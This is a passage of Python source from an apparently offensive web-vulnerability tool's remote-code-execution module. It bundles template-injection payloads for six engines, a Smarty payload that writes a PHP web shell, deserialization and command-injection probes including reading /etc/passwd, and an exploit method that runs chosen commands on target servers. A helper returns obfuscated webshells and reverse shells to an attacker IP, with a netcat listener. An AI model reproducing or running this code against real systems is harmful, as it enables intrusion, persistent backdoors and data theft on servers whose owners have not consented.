        # Twig
        ("{{7*'7'}}", "49", "twig", 0.9),
        ("{{dump(app)}}", "Twig", "twig", 0.8),
        # Freemarker
        ("<#assign x=7*7>${x}", "49", "freemarker", 0.95),
        ("${.now?date}", "", "freemarker", 0.7),
        # Velocity
        ("#set($x=7*7)${x}", "49", "velocity", 0.95),
        # Smarty
        ("{$smarty.version}", "", "smarty", 0.8),
        ("{math equation='7*7'}", "49", "smarty", 0.9),
        # Mako
        ("${7*7}", "49", "mako", 0.8),
        # Pebble
        ("{{ 7 * 7 }}", "49", "pebble", 0.7),
    ]

    RCE_PAYLOADS: Dict[str, List[str]] = {
        "jinja2": [
            # __subclasses__ chain via warnings.catch_warnings
            "{{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['__builtins__']['__import__']('os').popen(CMD).read()}}",
            # config globals chain
            "{{config.__class__.__init__.__globals__['os'].popen(CMD).read()}}",
            # request.application chain
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')(CMD)|attr('read')()}}",
            # cycler chain
            "{{cycler.__init__.__globals__.os.popen(CMD).read()}}",
        ],
        "twig": [
            "{{['CMD']|filter('system')}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('CMD')}}",
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"CMD\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"CMD\")}",
        ],
        "velocity": [
            "#set($rt=$class.forName('java.lang.Runtime'))"
            "#set($mt=$rt.getMethod('exec',$class.forName('java.lang.String')))"
            "#set($proc=$mt.invoke($rt.getRuntime(),'CMD'))"
            "#set($is=$proc.getInputStream())"
            "#set($sc=$class.forName('java.util.Scanner'))"
            "#set($s=$sc.getDeclaredConstructors()[0])"
            "#set($u=$s.newInstance($is))"
            "${u.next()}",
        ],
        "smarty": [
            "{php}echo shell_exec('CMD');{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
        ],
        "mako": [
            "<%\nimport os\n%>${os.popen('CMD').read()}",
            "${__import__('os').popen('CMD').read()}",
        ],
    }

    def __init__(self, http_engine):
        self.http = http_engine

    def detect(self, url: str, param: str) -> Optional[Dict]:
        """
        Walk the probe tree and return the first confirmed SSTI hit.
        Returns dict with engine, payload, confidence or None.
        """
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        if param not in params_dict:
            return None

        engine_votes: Dict[str, float] = defaultdict(float)
        best_hit: Optional[Dict] = None

        for payload, expected, engine_hint, conf in self.PROBE_TREE:
            test_params = params_dict.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            resp = self.http.get(test_url)
            if not resp:
                continue

            if expected and expected in resp.text:
                final_conf = conf
                detected_engine = engine_hint or "unknown"

                if engine_hint:
                    engine_votes[engine_hint] += conf
                else:
                    for eng in ["jinja2", "twig", "freemarker", "velocity", "smarty", "mako"]:
                        engine_votes[eng] += conf * 0.15

                if best_hit is None or final_conf > best_hit["confidence"]:
                    best_hit = {
                        "type": "SSTI",
                        "engine": detected_engine,
                        "payload": payload,
                        "expected": expected,
                        "confidence": final_conf,
                        "url": url,
                        "parameter": param,
                        "category": VT.SSTI,
                    }

        if best_hit and engine_votes:
            best_engine = max(engine_votes, key=engine_votes.__getitem__)
            best_hit["engine"] = best_engine
            best_hit["confidence"] = min(0.99, engine_votes[best_engine])

        return best_hit

    def exploit(self, url: str, param: str, engine: str, command: str = "id") -> Optional[str]:
        """Try each RCE payload for the given engine and return command output."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        for template in self.RCE_PAYLOADS.get(engine, []):
            payload = template.replace("CMD", command)
            test_params = params_dict.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            resp = self.http.get(test_url)
            if resp and resp.status_code == 200:
                return resp.text

        return None


# DESERIALIZATION DETECTOR

class DeserializationDetector:
    """
    Detects insecure deserialization vulnerabilities.
    Supports PHP, Java, Python pickle, .NET, Ruby Marshal.
    """

    # PHP serialized probe objects (benign)
    PHP_PROBES = [
        'O:8:"stdClass":0:{}',
        'O:1:"A":0:{}',
        's:4:"test";',
        'a:1:{i:0;s:4:"test";}',
    ]

    # Java magic bytes (base64)
    JAVA_MAGIC_B64 = "rO0AB"  # \xac\xed\x00\x05 in base64

    # Python pickle probe (calls print, harmless)
    PYTHON_PICKLE_PROBE = base64.b64encode(
        b"\x80\x04\x95\x10\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04repr\x94\x93\x8c\x01\x31\x94\x85\x94R\x94."
    ).decode()

    ERROR_PATTERNS = {
        "php": [
            r"unserialize\(\)",
            r"__wakeup",
            r"__destruct",
            r"Exception.*unserialize",
            r"Unserialization error",
            r"O:\d+:\"",
        ],
        "java": [
            r"ClassNotFoundException",
            r"NotSerializableException",
            r"InvalidClassException",
            r"java\.io\.ObjectInputStream",
            r"java\.io\.Serializable",
        ],
        "python": [
            r"_pickle\.UnpicklingError",
            r"pickle\.UnpicklingError",
            r"cPickle",
            r"AttributeError.*__reduce__",
        ],
        "dotnet": [
            r"BinaryFormatter",
            r"System\.Runtime\.Serialization",
            r"DeserializationException",
            r"SerializationException",
        ],
    }

    def __init__(self, http_engine):
        self.http = http_engine

    def detect(self, url: str, param: str) -> Optional[Dict]:
        """Test for deserialization across languages."""
        result = (
            self._detect_php(url, param)
            or self._detect_java(url, param)
            or self._detect_python(url, param)
        )
        return result

    def _detect_php(self, url: str, param: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        for probe in self.PHP_PROBES:
            for encoded in [probe, base64.b64encode(probe.encode()).decode()]:
                test_params = params_dict.copy()
                test_params[param] = [encoded]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self.http.get(test_url)
                if not resp:
                    continue

                for pattern in self.ERROR_PATTERNS["php"]:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        return {
                            "type": "PHP Deserialization",
                            "url": url,
                            "parameter": param,
                            "payload": encoded,
                            "confidence": 0.85,
                            "category": VT.DESERIALIZATION,
                        }
        return None

    def _detect_java(self, url: str, param: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        test_params = params_dict.copy()
        test_params[param] = [self.JAVA_MAGIC_B64]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        resp = self.http.get(test_url)
        if not resp:
            return None

        for pattern in self.ERROR_PATTERNS["java"]:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    "type": "Java Deserialization",
                    "url": url,
                    "parameter": param,
                    "payload": self.JAVA_MAGIC_B64,
                    "confidence": 0.88,
                    "category": VT.DESERIALIZATION,
                }
        return None

    def _detect_python(self, url: str, param: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        test_params = params_dict.copy()
        test_params[param] = [self.PYTHON_PICKLE_PROBE]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        resp = self.http.get(test_url)
        if not resp:
            return None

        for pattern in self.ERROR_PATTERNS["python"]:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    "type": "Python Deserialization",
                    "url": url,
                    "parameter": param,
                    "payload": self.PYTHON_PICKLE_PROBE,
                    "confidence": 0.82,
                    "category": VT.DESERIALIZATION,
                }
        return None


# MAIN RCE MODULE

class RCEModule:
    """
    Professional Remote Code Execution detection and exploitation module.

    Techniques:
      - Direct command injection (all separators, all contexts)
      - Blind time-based command injection (statistical analysis)
      - Blind boolean-based command injection
      - eval/code injection (PHP, Python eval)
      - Server-Side Template Injection (6 engines)
      - PHP / Java / Python deserialization

    Usage:
        engine = HTTPEngine(...)
        rce = RCEModule(engine)
        vulns = rce.scan("https://target.com/page?input=test")
        for v in vulns:
            result = rce.exploit(v, command="id")
    """

    def __init__(self, http_engine, evasion_engine=None):
        self.http = http_engine
        self.evasion = evasion_engine
        self.payload_gen = CommandPayloadGenerator()
        self.blind = BlindDetectionEngine(http_engine)
        self.verifier = VerificationEngine(http_engine)
        self.ssti = SSTIEngine(http_engine)
        self.deser = DeserializationDetector(http_engine)
        self._os: OS = OS.UNKNOWN


    def scan(
        self,
        url: str,
        fast_mode: bool = False,
        deep_mode: bool = True,
        test_ssti: bool = True,
        test_deserialization: bool = True,
        timeout_per_param: int = 120,
    ) -> List[RCEVulnerability]:
        """
        Comprehensive RCE scan.

        Args:
            url: Target URL with query parameters.
            fast_mode: Run only the fastest probes (fewer false negatives traded for speed).
            deep_mode: Include SSTI, deserialization, and eval injection.
            test_ssti: Toggle SSTI engine.
            test_deserialization: Toggle deserialization detector.
            timeout_per_param: Per-test timeout in seconds.

        Returns:
            Deduplicated list of RCEVulnerability objects.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            logger.warning("[RCE] No parameters found in URL")
            return []

        logger.info(f"[RCE] Scanning {len(params)} parameter(s): {list(params.keys())}")

        if fast_mode:
            test_funcs = [self._test_cmd_fast, self._test_time_fast]
        else:
            test_funcs = [self._test_cmd_direct, self._test_time_based, self._test_boolean_blind]
            if deep_mode:
                test_funcs.append(self._test_eval_injection)

        jobs: List[Tuple[str, str, Any]] = []
        for param in params:
            for fn in test_funcs:
                jobs.append((param, fn.__name__, fn))
            if test_ssti and not fast_mode:
                jobs.append((param, "ssti", self._test_ssti))
            if test_deserialization and not fast_mode:
                jobs.append((param, "deserialization", self._test_deserialization))

        found: List[RCEVulnerability] = []
        seen_keys: set = set()

        with ThreadPoolExecutor(max_workers=min(len(jobs), 15)) as pool:
            futures = {
                pool.submit(fn, url, param): (param, name)
                for param, name, fn in jobs
            }

            for future in as_completed(futures):
                param, name = futures[future]
                try:
                    result = future.result(timeout=timeout_per_param)
                    if result is None:
                        continue

                    items = result if isinstance(result, list) else [result]
                    for vuln in items:
                        key = (vuln.url, vuln.parameter, vuln.technique.value)
                        if key not in seen_keys:
                            seen_keys.add(key)
                            found.append(vuln)
                            logger.info(
                                f"[RCE] ✓ {vuln.technique.value} @ param='{vuln.parameter}' "
                                f"OS={vuln.os.name} conf={vuln.confidence:.0%}"
                            )
                except TimeoutError:
                    logger.debug(f"[RCE] Timeout: {name} on '{param}'")
                except Exception as exc:
                    logger.debug(f"[RCE] Error in {name} on '{param}': {exc}")

        return found

    def exploit(self, vulnerability: RCEVulnerability, command: str = "id") -> Dict[str, Any]:
        """
        Execute a command using the confirmed injection vector.

        Returns:
            Dict with 'success', 'output', 'technique', and 'command' keys.
        """
        result: Dict[str, Any] = {
            "technique": vulnerability.technique.value,
            "command": command,
            "success": False,
            "output": None,
        }

        parsed = urlparse(vulnerability.url)
        params_dict = parse_qs(parsed.query)
        original = params_dict.get(vulnerability.parameter, [""])[0]

        if vulnerability.technique in (
            RCETechnique.COMMAND_INJECTION,
            RCETechnique.BLIND_COMMAND_INJECTION,
            RCETechnique.TIME_BASED_COMMAND,
        ):
            separators = [";", "|", "&&", "`", "$(", "&"] if vulnerability.os == OS.WINDOWS else [";", "|", "&&", "`", "$("]
            for sep in separators:
                cmd_part = f"`{command}`" if sep == "`" else f"$({command})" if sep == "$(" else f"{sep}{command}"
                payload = original + cmd_part

                test_params = params_dict.copy()
                test_params[vulnerability.parameter] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self.http.get(test_url)
                if resp and resp.status_code == 200:
                    result["success"] = True
                    result["output"] = resp.text
                    break

        elif vulnerability.technique == RCETechnique.SSTI:
            engine = vulnerability.metadata.get("engine", "jinja2")
            output = self.ssti.exploit(vulnerability.url, vulnerability.parameter, engine, command)
            if output:
                result["success"] = True
                result["output"] = output

        elif vulnerability.technique == RCETechnique.EVAL_INJECTION:
            for php_func in ["system", "passthru", "shell_exec", "exec"]:
                payload = f'{php_func}("{command}");'
                test_params = params_dict.copy()
                test_params[vulnerability.parameter] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self.http.get(test_url)
                if resp and resp.status_code == 200:
                    result["success"] = True
                    result["output"] = resp.text
                    break

        return result

    def get_shell_payloads(self, vulnerability: RCEVulnerability, attacker_ip: str, port: int = 4444) -> Dict:
        """Return ready-to-use webshell and reverse shell payloads for this vulnerability."""
        from payloads.webshells import WebShellGenerator
        from payloads.reverse_shells import ReverseShellGenerator

        ws_gen = WebShellGenerator()
        rs_gen = ReverseShellGenerator(attacker_ip, port)
        target_os = vulnerability.os

        return {
            "target_os": target_os.name,
            "webshells": {
                "php": ws_gen.generate_php_shell(obfuscation_level=3),
                "aspx": ws_gen.generate_aspx_shell(),
                "jsp": ws_gen.generate_jsp_shell(),
            },
            "reverse_shells": {
                "bash": rs_gen.bash(),
                "python": rs_gen.python(),
                "powershell": rs_gen.powershell(),
                "perl": rs_gen.perl(),
                "nc": rs_gen.netcat(),
            },
            "listener": f"nc -lvnp {port}",
        }

    # Private test methods

    def _test_cmd_direct(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Full command injection scan across separators and OS command sets."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original = params_dict[param][0]

        probes = [
            # (separator, os_target, command, output_pattern)
            (";", OS.LINUX, "id", r"uid=\d+\(\w+\)\s+gid=\d+"),
            ("|", OS.LINUX, "id", r"uid=\d+"),
            ("&&", OS.LINUX, "id", r"uid=\d+"),
            ("`", OS.LINUX, "id", r"uid=\d+"),
            ("$(", OS.LINUX, "id", r"uid=\d+"),
            ("\n", OS.LINUX, "id", r"uid=\d+"),
            (";", OS.LINUX, "whoami", r"^(root|www-data|\w+)$"),
            (";", OS.LINUX, "cat /etc/passwd", r"root:x:0"),
            ("&", OS.WINDOWS, "whoami", r"[\w-]+\\[\w-]+"),
            ("|", OS.WINDOWS, "ver", r"Version"),
            ("&", OS.WINDOWS, "hostname", r"^[\w-]+$"),
        ]

        for sep, os_type, cmd, pattern in probes:
            if self._os not in (OS.UNKNOWN, os_type):
                continue

            cmd_part = f"`{cmd}`" if sep == "`" else f"$({cmd})" if sep == "$(" else f"{sep}{cmd}"

            for prefix in [original, "", "1"]:
                payload = prefix + cmd_part
                test_params = params_dict.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self.http.get(test_url)
                if not resp:
                    continue

                m = re.search(pattern, resp.text, re.MULTILINE | re.IGNORECASE)
                if m:
                    detected_os, _ = OSFingerprinter.identify(resp.text)
                    self._os = detected_os if detected_os != OS.UNKNOWN else os_type

                    return RCEVulnerability(
                        url=url,
                        parameter=param,
                        technique=RCETechnique.COMMAND_INJECTION,
                        os=self._os,
                        payload=payload,
                        confidence=0.99,
                        exploitable=True,
                        command_output=resp.text[:2000],
                        injection_context=InjectionContext.SEMICOLON,
                        metadata={"separator": sep, "command": cmd, "match": m.group(0)},
                    )
        return None

    def _test_cmd_fast(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Minimal fast probes — 7 requests per parameter."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original = params_dict[param][0]

        fast = [
            (f"{original};id", OS.LINUX, r"uid=\d+"),
            (f"{original}|id", OS.LINUX, r"uid=\d+"),
            (f"{original}&&id", OS.LINUX, r"uid=\d+"),
            (f"`id`", OS.LINUX, r"uid=\d+"),
            (f"$(id)", OS.LINUX, r"uid=\d+"),
            (f"{original}&whoami", OS.WINDOWS, r"[\w-]+\\[\w-]+"),
            (f"{original}|ver", OS.WINDOWS, r"Version"),
        ]

        for payload, os_type, pattern in fast:
            test_params = params_dict.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            resp = self.http.get(test_url)
            if resp and re.search(pattern, resp.text, re.MULTILINE):
                detected_os, _ = OSFingerprinter.identify(resp.text)
                self._os = detected_os if detected_os != OS.UNKNOWN else os_type

                return RCEVulnerability(
                    url=url, parameter=param,
                    technique=RCETechnique.COMMAND_INJECTION,
                    os=self._os, payload=payload,
                    confidence=0.97, exploitable=True,
                    command_output=resp.text[:1000],
                )
        return None

    def _test_time_based(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Statistical time-based blind injection detection."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original = params_dict[param][0]

        delay = 5
        candidates = [
            (OS.LINUX, f"{original}; sleep {delay}"),
            (OS.LINUX, f"{original}| sleep {delay}"),
            (OS.LINUX, f"{original}&& sleep {delay}"),
            (OS.LINUX, f"`sleep {delay}`"),
            (OS.LINUX, f"$(sleep {delay})"),
            (OS.LINUX, f"{original}; ping -c {delay} 127.0.0.1"),
            (OS.WINDOWS, f"{original}& timeout {delay}"),
            (OS.WINDOWS, f"{original}| timeout {delay}"),
            (OS.WINDOWS, f"{original}& ping -n {delay} 127.0.0.1"),
        ]

        baseline = self.blind.get_baseline(url, samples=5)
        if "error" in baseline:
            return None

        for os_type, payload in candidates:
            if self._os not in (OS.UNKNOWN, os_type):
                continue

            is_vuln, analysis = self.blind.test_time_condition(
                url, param, original, payload.replace(original, ""), delay, samples=2
            )

            if is_vuln:
                self._os = os_type
                return RCEVulnerability(
                    url=url, parameter=param,
                    technique=RCETechnique.TIME_BASED_COMMAND,
                    os=os_type, payload=payload,
                    confidence=0.93, exploitable=True,
                    metadata=analysis,
                )
        return None

    def _test_time_fast(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Single-sample fast time-based test."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original = params_dict[param][0]

        delay = 5
        baseline_start = time.time()
        self.http.get(url)
        baseline_time = time.time() - baseline_start

        fast = [
            (OS.LINUX, f"{original}; sleep {delay}"),
            (OS.WINDOWS, f"{original}& timeout {delay}"),
        ]

        for os_type, payload in fast:
            test_params = params_dict.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            start = time.time()
            self.http.get(test_url)
            elapsed = time.time() - start

            if (elapsed - baseline_time) >= (delay - 1.5):
                self._os = os_type
                return RCEVulnerability(
                    url=url, parameter=param,
                    technique=RCETechnique.TIME_BASED_COMMAND,
                    os=os_type, payload=payload,
                    confidence=0.88, exploitable=True,
                    metadata={"elapsed": elapsed, "baseline": baseline_time},
                )
        return None

    def _test_boolean_blind(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Boolean-based blind command injection."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original = params_dict[param][0]

        pairs = [
            ("; test 1", "; test 0", OS.LINUX),
            ("; true", "; false", OS.LINUX),
            ("; [ -f /etc/passwd ]", "; [ -f /erebus_nonexistent_12345 ]", OS.LINUX),
            ("& ver", "& dir C:\\erebus_nonexistent_12345\\", OS.WINDOWS),
        ]

        for true_suf, false_suf, os_type in pairs:
            is_vuln, analysis = self.blind.test_boolean_condition(
                url, param, original, true_suf, false_suf, samples=3
            )

            if is_vuln and analysis.get("confidence", 0) >= 0.7:
                self._os = os_type
                return RCEVulnerability(
                    url=url, parameter=param,
                    technique=RCETechnique.BLIND_COMMAND_INJECTION,
                    os=os_type,
                    payload=original + true_suf,
                    confidence=analysis["confidence"],
                    exploitable=True,
                    metadata=analysis,
                    verification_results={"true": true_suf, "false": false_suf},
                )
        return None

    def _test_eval_injection(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """PHP / Python eval injection."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        probes = [
            ('system("id");', r"uid=\d+"),
            ('passthru("id");', r"uid=\d+"),
            ('shell_exec("id");', r"uid=\d+"),
            ("echo `id`;", r"uid=\d+"),
            ("__import__('os').system('id')", r"uid=\d+"),
        ]

        for payload, pattern in probes:
            test_params = params_dict.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            resp = self.http.get(test_url)
            if resp and re.search(pattern, resp.text):
                return RCEVulnerability(
                    url=url, parameter=param,
                    technique=RCETechnique.EVAL_INJECTION,
                    os=OS.LINUX, payload=payload,
                    confidence=0.95, exploitable=True,
                    command_output=resp.text[:500],
                )
        return None

    def _test_ssti(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Delegate to SSTIEngine."""
        hit = self.ssti.detect(url, param)
        if not hit:
            return None

        return RCEVulnerability(
            url=url, parameter=param,
            technique=RCETechnique.SSTI,
            os=OS.UNKNOWN,
            payload=hit["payload"],
            confidence=hit["confidence"],
            exploitable=True,
            metadata={"engine": hit.get("engine"), "expected": hit.get("expected")},
        )

    def _test_deserialization(self, url: str, param: str) -> Optional[RCEVulnerability]:
        """Delegate to DeserializationDetector."""
        hit = self.deser.detect(url, param)
        if not hit:
            return None

        technique_map = {
            "PHP Deserialization": RCETechnique.PHP_DESERIALIZATION,
            "Java Deserialization": RCETechnique.JAVA_DESERIALIZATION,
            "Python Deserialization": RCETechnique.PYTHON_PICKLE,
        }

        return RCEVulnerability(
            url=url, parameter=param,
            technique=technique_map.get(hit["type"], RCETechnique.PHP_DESERIALIZATION),
            os=OS.UNKNOWN,
            payload=hit["payload"],
            confidence=hit["confidence"],
            exploitable=True,
            metadata={"type": hit["type"]},
        )

